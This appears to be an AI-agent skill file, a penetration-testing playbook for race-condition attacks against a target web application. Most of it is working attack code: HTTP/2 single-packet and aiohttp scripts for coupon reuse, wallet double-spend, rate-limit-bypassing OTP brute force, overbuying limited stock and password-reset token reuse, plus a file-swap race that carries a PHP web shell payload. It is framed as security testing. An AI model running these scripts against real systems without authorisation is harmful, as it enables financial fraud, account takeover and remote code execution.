---
name: race-conditions
description: Use when testing for race conditions, single-packet attacks, TOCTOU vulnerabilities, limit-bypass via concurrent requests, coupon/voucher reuse, double-spend, rate limit bypass, or parallel request timing attacks. Also use when the user says "race condition", "single packet attack", "concurrent requests", "double spend", "limit bypass", or "TOCTOU".
---

# Race Condition Attack Playbook

## Philosophy
Race conditions are invisible to static analysis and most scanners.
The gap between CHECK and USE is always exploitable if requests arrive simultaneously.
HTTP/2 single-packet attack sends all requests in ONE TCP frame = true simultaneity.
Never claim a race condition without repeatable proof - screenshot or log showing duplicate resource use.

## Arguments
`<target>` - domain (e.g. app.target.com)
`<focus>` - optional: COUPON / WALLET / RATE-LIMIT / TOCTOU / LIMIT-BYPASS / FULL

---

## Phase 0: Smart Intake

```bash
source ~/.claude/skills/_shared/phase0.sh
source ~/.claude/skills/_shared/signals.sh

p0_init_vars "$1"
p0_state_gate "HARVEST" || exit 0
p0_read_relay recon exploit
p0_read_memory
p0_read_hypotheses

# Narrow endpoints to race-relevant paths
RACE_TARGETS=$(echo "$INTERESTING_ENDPOINTS" | grep -iE "coupon|promo|voucher|redeem|claim|bonus|reward|withdraw|transfer|wallet|checkout|order|cart|limit|rate|reset|verify|otp" | head -20)
WAYBACK_ENDPOINTS=$(echo "$WAYBACK_ENDPOINTS" | grep -iE "coupon|redeem|transfer|withdraw|claim" | head -10)
TECH_STACK=$KNOWN_TECH
HTTP2_LIKELY=$(echo "$TECH_STACK" | grep -qi "nginx\|cloudflare\|h2\|http/2" && echo true || echo false)

echo "=== PHASE 0 RACE CONDITIONS INTAKE: $TARGET ==="
echo "State: $STATE | HTTP/2 likely: $HTTP2_LIKELY"
echo "Race-relevant endpoints found in recon: $(echo "$RACE_TARGETS" | grep -c . 2>/dev/null || echo 0)"
echo "Race targets: $RACE_TARGETS"
echo "ATW flagged (avoid): ${ATW_FLAGGED:-none}"
```

### Execution Manifest

One manifest item per endpoint type found. Do not run generic "test everything" - target specific endpoints extracted from recon.

```bash
# Build items dynamically based on RACE_TARGETS found above.
# Template - replace <endpoint> with actual URLs from RACE_TARGETS.

MANIFEST=$(cat << 'MANIFEST_EOF'
{
  "phase": "race-conditions",
  "generated_at": "YYYY-MM-DD HH:MM",
  "items": [
    {"id":"rc01","tool":"single-packet-race","target":"<coupon/redeem endpoint from recon>","reason":"coupon reuse = direct financial impact","priority":"MUST","status":"pending","skip_reason":"set to skipped if no coupon endpoint found"},
    {"id":"rc02","tool":"single-packet-race","target":"<wallet/transfer endpoint from recon>","reason":"double-spend = critical financial impact","priority":"MUST","status":"pending","skip_reason":"set to skipped if no wallet endpoint found"},
    {"id":"rc03","tool":"single-packet-race","target":"<otp/reset endpoint from recon>","reason":"rate limit bypass -> OTP brute force","priority":"SHOULD","status":"pending","skip_reason":"set to skipped if no OTP endpoint found"},
    {"id":"rc04","tool":"endpoint-discovery","target":"<target>/api","reason":"find limit-enforcement endpoints not in recon intel","priority":"MUST","status":"pending","skip_reason":null},
    {"id":"rc05","tool":"single-packet-race","target":"<checkout/order endpoint>","reason":"buy more than available qty","priority":"SHOULD","status":"pending","skip_reason":"set to skipped if no checkout endpoint found"},
    {"id":"rc06","tool":"toctou-file-race","target":"<file upload endpoint>","reason":"AV scan window = malicious file delivery","priority":"IF_TIME","status":"pending","skip_reason":"skip if no file upload surface found"}
  ]
}
MANIFEST_EOF
)

jq --argjson m "$MANIFEST" '.scalpel.active_manifest = $m' $SESSION > /tmp/s.json && mv /tmp/s.json $SESSION
```

**Manifest adjustment rules:**
- If `RACE_TARGETS` contains coupon/redeem URLs: set rc01 target to those exact URLs
- If `RACE_TARGETS` contains wallet/transfer URLs: set rc02 target to those exact URLs
- If `RACE_TARGETS` is empty: rc01, rc02, rc05 remain pending but rc04 becomes MUST (discover endpoints first)
- If `HTTP2_LIKELY=false`: note that single-packet attack may require Burp Turbo Intruder fallback (Phase 3)
- If `STATE=DEEP` and existing confirmed vuln is financial: rc04, rc06 become IF_TIME only

---

## Phase 1 - Identify Race Condition Targets

**High-value targets - always test these first:**

```
CRITICAL TARGETS (one-time use resources):
- Coupon/promo code redemption
- Password reset token use
- Email verification token
- Referral bonus claim
- Gift card redemption
- One-time login links

HIGH VALUE (limit enforcement):
- Withdrawal / transfer (wallet balance check -> debit)
- Purchase of limited-quantity items
- Rate-limited API endpoints (forgot password, OTP, login)
- Free tier usage limits (API calls, downloads, exports)
- Like/vote/reaction (should be once per user)

MEDIUM (state transitions):
- Order cancellation after fulfillment starts
- Account deletion (deletes while logged in)
- Permission changes concurrent with permission check
- File upload + virus scan + availability window
```

```bash
# Find limit-enforcement endpoints from prior recon:
grep -i "coupon\|promo\|voucher\|redeem\|claim\|bonus\|reward\|withdraw\|transfer\|limit\|rate" \
  ~/pentest-toolkit/results/<target>/interesting_recon.md 2>/dev/null

# Also check: /api/v*/wallet, /api/v*/coupon, /api/v*/redeem, /api/v*/transfer
```

---

## Phase 2 - HTTP/2 Single-Packet Attack (James Kettle, Black Hat 2023)

**The gold standard.** All requests in ONE TCP segment = identical server arrival time.

```python
#!/usr/bin/env python3
# single_packet_race.py - HTTP/2 single packet race condition
# Install: pip install httpx[http2]

import httpx
import asyncio
import json

TARGET = "https://app.target.com"
ENDPOINT = "/api/coupon/redeem"
SESSION_COOKIE = "session=YOUR_SESSION_TOKEN"

# Payload to send N times simultaneously
PAYLOAD = {"code": "SAVE50", "orderId": "ORD-12345"}

async def single_packet_race(n_requests=20):
    """Send N requests in true HTTP/2 single-packet attack."""
    async with httpx.AsyncClient(http2=True, cookies={"session": SESSION_COOKIE}) as client:
        # Pre-warm connection (establish HTTP/2 stream, don't count)
        await client.get(f"{TARGET}/api/health")
        
        # Fire all N requests concurrently - httpx batches HTTP/2 streams
        tasks = [
            client.post(f"{TARGET}{ENDPOINT}", json=PAYLOAD)
            for _ in range(n_requests)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
    
    results = {}
    for i, r in enumerate(responses):
        if isinstance(r, Exception):
            results[i] = f"ERROR: {r}"
        else:
            results[i] = {"status": r.status_code, "body": r.text[:200]}
    return results

if __name__ == "__main__":
    results = asyncio.run(single_packet_race(20))
    successes = [r for r in results.values() if isinstance(r, dict) and r["status"] == 200]
    print(f"Sent 20 requests, got {len(successes)} successes")
    for r in successes[:5]:
        print(r["body"])
    # VULNERABLE: multiple 200s with discount applied = coupon used N times
```

---

## Phase 3 - Burp Suite Turbo Intruder (Browser-Based Testing)

```python
# Turbo Intruder script: race_single_packet_attack.py
# In Burp: send request to Repeater -> right-click -> Extensions -> Turbo Intruder

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=20,   # All in one connection
                          pipeline=True)
    
    # Queue 20 identical requests
    for i in range(20):
        engine.queue(target.req, None)

def handleResponse(req, interesting):
    # Flag any response that's different from the expected "already used" error
    if req.status != 400:  # 400 = "coupon already used"
        table.add(req)
```

**Burp Suite Repeater - Group Tab method:**
1. Create tab group with 20 identical "redeem coupon" requests
2. Right-click group -> "Send group in parallel (single-packet attack)"
3. Check responses - if multiple 200s = vulnerable

---

## Phase 4 - aiohttp Parallel Attack (HTTP/1.1 Fallback)

```python
#!/usr/bin/env python3
# aiohttp_race.py - when HTTP/2 unavailable

import asyncio, aiohttp, time

TARGET = "https://app.target.com"
HEADERS = {"Cookie": "session=YOUR_TOKEN", "Content-Type": "application/json"}

async def fire(session, url, data):
    async with session.post(url, json=data, headers=HEADERS) as r:
        body = await r.text()
        return r.status, body[:200]

async def race(url, data, count=30):
    async with aiohttp.ClientSession() as session:
        # Pre-warm
        async with session.get(TARGET + "/api/health") as _: pass
        
        # Gather all at exact moment
        results = await asyncio.gather(*[fire(session, url, data) for _ in range(count)])
    return results

results = asyncio.run(race(f"{TARGET}/api/coupon/redeem", {"code": "SAVE50"}))
successes = [(s, b) for s, b in results if s == 200]
print(f"{len(successes)}/{len(results)} succeeded")
for s, b in successes[:3]: print(b)
```

---

## Phase 5 - Specific Race Condition Scenarios

### Scenario A: Coupon / Promo Code Reuse
```bash
# Manual test with curl:
for i in $(seq 1 10); do
  curl -s -X POST https://<target>/api/coupon/redeem \
    -H "Cookie: session=<token>" \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE50","orderId":"ORD-999"}' &
done
wait
# If multiple requests return discount applied = vulnerable
# Evidence: order history shows discount applied multiple times
```

### Scenario B: Wallet Double-Spend
```python
# Two simultaneous withdrawals of full balance
# If balance=100 and both check "balance >= amount" before deducting:
# Both pass the check -> both deduct -> balance = -100

import asyncio, httpx

async def withdraw(client, amount):
    return await client.post("/api/wallet/withdraw",
                             json={"amount": amount},
                             headers={"Authorization": "Bearer <token>"})

async def double_spend():
    async with httpx.AsyncClient(base_url="https://<target>", http2=True) as c:
        r1, r2 = await asyncio.gather(
            withdraw(c, 100),  # full balance
            withdraw(c, 100)   # same full balance
        )
        print(r1.json(), r2.json())
        # Both succeed = double-spend = Critical

asyncio.run(double_spend())
```

### Scenario C: Rate Limit Bypass (OTP / Login)
```python
# OTP brute force bypassing rate limit via parallel requests
import asyncio, httpx

OTP_CODES = [str(i).zfill(6) for i in range(1000)]  # test range

async def try_otp(client, code):
    r = await client.post("/api/verify-otp", json={"otp": code, "session": "<id>"})
    if "success" in r.text.lower() or r.status_code == 200:
        return code
    return None

async def race_otp():
    async with httpx.AsyncClient(base_url="https://<target>", http2=True) as c:
        # Send 50 at once (bypasses per-request rate limiting)
        for batch_start in range(0, len(OTP_CODES), 50):
            batch = OTP_CODES[batch_start:batch_start+50]
            results = await asyncio.gather(*[try_otp(c, otp) for otp in batch])
            found = [r for r in results if r]
            if found:
                print(f"VALID OTP: {found[0]}")
                return

asyncio.run(race_otp())
```

### Scenario D: Limited Quantity Item (Buy More Than Available)
```python
# Item: quantity=1 remaining
# Purchase 20 simultaneously -> some succeed before quantity check

import asyncio, httpx

async def purchase(client):
    return await client.post("/api/cart/checkout",
                             json={"item_id": "LIMITED-ITEM-123", "qty": 1},
                             headers={"Cookie": "session=<token>"})

async def race_purchase():
    async with httpx.AsyncClient(base_url="https://<target>", http2=True) as c:
        results = await asyncio.gather(*[purchase(c) for _ in range(20)])
    successes = [r for r in results if r.status_code == 200]
    print(f"{len(successes)} purchases succeeded for item with qty=1")
    # Evidence: order history shows N orders for 1-quantity item

asyncio.run(race_purchase())
```

### Scenario E: Password Reset Token Reuse (TOCTOU)
```python
# Token is marked "used" AFTER session is created, not atomically
# Two simultaneous uses before the "mark used" write completes

import asyncio, httpx

TOKEN = "reset-token-from-email"

async def use_token(client):
    return await client.post("/api/reset-password",
                             json={"token": TOKEN, "newPassword": "HackerPass123!"})

async def race_reset():
    async with httpx.AsyncClient(base_url="https://<target>", http2=True) as c:
        r1, r2 = await asyncio.gather(use_token(c), use_token(c))
        print("Request 1:", r1.status_code, r1.json())
        print("Request 2:", r2.status_code, r2.json())
        # Both 200 = token reused = can set two different passwords
        # Impact: attacker races victim's reset -> maintains access

asyncio.run(race_reset())
```

---

## Phase 6 - TOCTOU File Race (Server-Side)

```bash
# Applicable when: app checks file content (AV scan) then serves it
# Window between "scan passes" and "file served" -> swap file

# Step 1: Upload clean file, note upload path
# Step 2: Script to continuously swap clean <-> malicious:

import os, time, threading

clean = b"This is clean content"
malicious = b'<?php system($_GET["cmd"]); ?>'
path = "/tmp/upload_race_test.php"

def swap_loop():
    while True:
        with open(path, 'wb') as f: f.write(malicious)
        time.sleep(0.001)
        with open(path, 'wb') as f: f.write(clean)
        time.sleep(0.001)

# While swap_loop runs, repeatedly request the file via the app
# If malicious content served (bypassing AV) = TOCTOU confirmed
```

---

## Evidence Requirements

**CONFIRMED (Critical):**
- Multiple successful responses where only 1 should succeed
- Wallet balance goes negative after race
- Screenshot of coupon applied N times in order history
- Two password reset sessions created from single token

**POTENTIAL:**
- Race window exists (test code shows logic gap) but couldn't trigger in testing
- HTTP/2 not available (HTTP/1.1 race is less precise)

**NOT A FINDING:**
- Server returns error for all but one (properly protected)
- Idempotency key in every request (properly designed API)

---

## Output

Write to `~/pentest-toolkit/results/<target>/interesting_race-conditions.md`:

```markdown
## Status
confirmed-vulnerable | potential | no-findings

## Summary
<endpoints tested, race conditions found, business impact>

## Confirmed Findings
- [CONFIRMED] Coupon code SAVE50 redeemed 7 times in one attack
  Impact: ~$350 discount obtained for $50 coupon
  Evidence: 7x HTTP 200 responses + order history screenshots
  Reproduce: python3 single_packet_race.py

## Race Condition Surface
| Endpoint | Type | Result | Requests Sent | Successes |
|----------|------|--------|---------------|-----------|
| /api/coupon/redeem | Coupon reuse | VULNERABLE | 20 | 7 |
| /api/wallet/withdraw | Double-spend | BLOCKED | 20 | 1 |
| /forgot-password | Rate limit bypass | POTENTIAL | 50 | N/A |

## Next Steps
1. <chain opportunity if partial>
2. <confirmation needed for potentials>
```

Tell user: "Race condition phase complete. `interesting_race-conditions.md` written. Key finding: <one-liner>. Run `/triage <target>` to aggregate."

---

## Phase-End: Completion Gate

```bash
PENDING_MUST=$(jq '[.scalpel.active_manifest.items[] | select(.priority=="MUST" and .status=="pending")] | length' $SESSION 2>/dev/null || echo 0)
if [ "$PENDING_MUST" -gt 0 ]; then
  echo "=== COMPLETION GATE BLOCKED ==="
  echo "$PENDING_MUST MUST items not completed:"
  jq '.scalpel.active_manifest.items[] | select(.priority=="MUST" and .status=="pending") | "\(.id): \(.tool) on \(.target)"' $SESSION
  echo "Run them or mark skipped with explicit reason before calling /triage."
fi
```
